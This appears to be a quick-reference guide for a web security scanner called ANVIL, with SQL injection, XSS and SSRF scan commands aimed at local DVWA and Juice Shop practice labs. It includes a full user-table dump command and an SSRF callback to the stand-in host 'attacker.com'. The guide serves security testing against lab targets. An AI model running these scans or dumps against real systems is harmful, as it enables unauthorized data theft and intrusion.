# ANVIL Quick Reference Guide

## Installation Status
✅ **ANVIL is installed globally** - Run `anvil` from anywhere!

## Test Environments Running
- 🐳 **DVWA**: http://localhost:8080 (Cookie: `PHPSESSID=l753f7jr75n1jiudknvj55igu1`)
- 🧃 **Juice Shop**: http://localhost:3000

## Quick Commands

### SQL Injection
```bash
# Basic SQLi scan
anvil -t "http://localhost:8080/vulnerabilities/sqli/?id=1&Submit=Submit" \
  -p id \
  --cookie "PHPSESSID=l753f7jr75n1jiudknvj55igu1; security=low" \
  --sqli

# SQLi with enumeration
anvil -t "http://localhost:8080/vulnerabilities/sqli/?id=1&Submit=Submit" \
  -p id \
  --cookie "PHPSESSID=l753f7jr75n1jiudknvj55igu1; security=low" \
  --sqli --dbs

# Full database dump
anvil -t "http://localhost:8080/vulnerabilities/sqli/?id=1&Submit=Submit" \
  -p id \
  --cookie "PHPSESSID=l753f7jr75n1jiudknvj55igu1; security=low" \
  --sqli -D dvwa -T users --dump
```

### XSS Detection
```bash
# Reflected XSS
anvil -t "http://localhost:8080/vulnerabilities/xss_r/?name=test" \
  -p name \
  --cookie "PHPSESSID=l753f7jr75n1jiudknvj55igu1; security=low" \
  --xss

# Verbose XSS (see methodology)
anvil -t "http://localhost:8080/vulnerabilities/xss_r/?name=test" \
  -p name \
  --cookie "PHPSESSID=l753f7jr75n1jiudknvj55igu1; security=low" \
  --xss --verbose

# All XSS types
anvil -t "http://localhost:8080/vulnerabilities/xss_r/?name=test" \
  -p name \
  --cookie "PHPSESSID=l753f7jr75n1jiudknvj55igu1; security=low" \
  --xss-all
```

### SSRF Detection (NEW!)
```bash
# Basic SSRF scan
anvil -t "http://localhost:8080/vulnerabilities/fi/?page=include.php" \
  -p page \
  --cookie "PHPSESSID=l753f7jr75n1jiudknvj55igu1; security=low" \
  --ssrf

# Comprehensive SSRF (all tests)
anvil -t "http://localhost:8080/vulnerabilities/fi/?page=include.php" \
  -p page \
  --cookie "PHPSESSID=l753f7jr75n1jiudknvj55igu1; security=low" \
  --ssrf --ssrf-all

# SSRF with internal network testing
anvil -t "http://localhost:8080/vulnerabilities/fi/?page=include.php" \
  -p page \
  --cookie "PHPSESSID=l753f7jr75n1jiudknvj55igu1; security=low" \
  --ssrf --ssrf-internal

# SSRF with cloud metadata testing
anvil -t "http://localhost:8080/vulnerabilities/fi/?page=include.php" \
  -p page \
  --cookie "PHPSESSID=l753f7jr75n1jiudknvj55igu1; security=low" \
  --ssrf --ssrf-metadata

# SSRF with scheme testing (file://, gopher://, etc.)
anvil -t "http://localhost:8080/vulnerabilities/fi/?page=include.php" \
  -p page \
  --cookie "PHPSESSID=l753f7jr75n1jiudknvj55igu1; security=low" \
  --ssrf --ssrf-schemes

# Blind SSRF with OOB callbacks
anvil -t "http://localhost:8080/vulnerabilities/fi/?page=include.php" \
  -p page \
  --cookie "PHPSESSID=l753f7jr75n1jiudknvj55igu1; security=low" \
  --ssrf --ssrf-callback attacker.com
```

### Comprehensive Scan (All Modules)
```bash
# Scan everything
anvil -t "http://localhost:8080/vulnerabilities/sqli/?id=1&Submit=Submit" \
  -p id \
  --cookie "PHPSESSID=l753f7jr75n1jiudknvj55igu1; security=low" \
  --all
```

## Security Levels in DVWA

Change security level by modifying the cookie:
- **Low**: `security=low`
- **Medium**: `security=medium`
- **High**: `security=high`

Example:
```bash
anvil -t "http://localhost:8080/vulnerabilities/sqli/?id=1" \
  -p id \
  --cookie "PHPSESSID=l753f7jr75n1jiudknvj55igu1; security=medium" \
  --sqli
```

## Output Options

```bash
# Verbose output (see full methodology)
anvil -t <URL> -p <param> --sqli --verbose

# Save report to file
anvil -t <URL> -p <param> --sqli -o report.txt

# JSON output
anvil -t <URL> -p <param> --sqli --format json -o results.json

# Quiet mode (minimal output)
anvil -t <URL> -p <param> --sqli --quiet
```

## Demo Scripts

### Run All Features Demo
```bash
./demo_all_features.sh
```

### Run SSRF Tests
```bash
./test_ssrf.sh
```

## SSRF Detection Features

### What Makes ANVIL's SSRF Detection Special?

1. **Evidence-Driven** - Not just URL reflection
2. **5-Stage Methodology**:
   - Parameter Identification
   - Reachability Testing
   - Controlled Probes
   - Evidence Analysis
   - Classification

3. **SSRF Classifications**:
   - **Confirmed SSRF** (Critical) - OOB callback or metadata access
   - **Internal Network SSRF** (High) - Internal IP reachable
   - **Blind SSRF** (High) - Async OOB only
   - **Limited SSRF** (Medium) - Request control but restricted
   - **SSRF Candidate** (Info) - Parameter influences fetch

4. **Test Types**:
   - Internal IP ranges (RFC1918, loopback, link-local)
   - Cloud metadata endpoints (AWS, GCP, Azure)
   - Non-HTTP schemes (file, gopher, ftp, dict)
   - Bypass techniques (encoding, @ bypass, CRLF)

5. **Key Principle**: **Reflection ≠ SSRF** (requires server-side network interaction)

## Common DVWA Endpoints

### SQL Injection
```
http://localhost:8080/vulnerabilities/sqli/?id=1&Submit=Submit
```

### XSS (Reflected)
```
http://localhost:8080/vulnerabilities/xss_r/?name=test
```

### XSS (Stored)
```
http://localhost:8080/vulnerabilities/xss_s/
```

### File Inclusion (SSRF-prone)
```
http://localhost:8080/vulnerabilities/fi/?page=include.php
```

### CSRF
```
http://localhost:8080/vulnerabilities/csrf/?password_new=1234&password_conf=1234&Change=Change
```

## Juice Shop Endpoints

### Search (XSS-prone)
```
http://localhost:3000/rest/products/search?q=test
```

### Login (SQLi-prone)
```
http://localhost:3000/rest/user/login
```

## Help & Documentation

```bash
# Show help
anvil --help

# Show version
anvil --version

# Show examples
anvil --help | grep -A 20 "EXAMPLES"
```

## Full Documentation

- `docs/USAGE.md` - Complete CLI reference
- `docs/SQL-INJECTION.md` - SQLi methodology & exploitation
- `docs/XSS-DETECTION.md` - XSS detection & validation
- `docs/SSRF-DETECTION.md` - SSRF detection methodology (NEW!)
- `docs/REPORTING.md` - Report formats & output modes
- `docs/QUICK_START.md` - Getting started guide

## Tips

1. **Always use `-p` flag** to specify the parameter to test
2. **Use `--verbose`** to see the full detection methodology
3. **Use `--cookie`** for authenticated scanning
4. **Start with low security** in DVWA, then increase
5. **Save reports** with `-o` for documentation
6. **Use `--all`** for comprehensive scanning

## Container Management

```bash
# Start containers
docker start dvwa juice-shop

# Stop containers
docker stop dvwa juice-shop

# Check status
docker ps | grep -E "(dvwa|juice)"

# View logs
docker logs dvwa
docker logs juice-shop
```

## Need Help?

- Check `anvil --help` for all options
- Read `docs/SSRF-DETECTION.md` for SSRF details
- Run demo scripts to see examples
- Use `--verbose` to understand detection logic

---

**ANVIL v0.1.0** - Enterprise-grade Adversarial Security Testing Framework

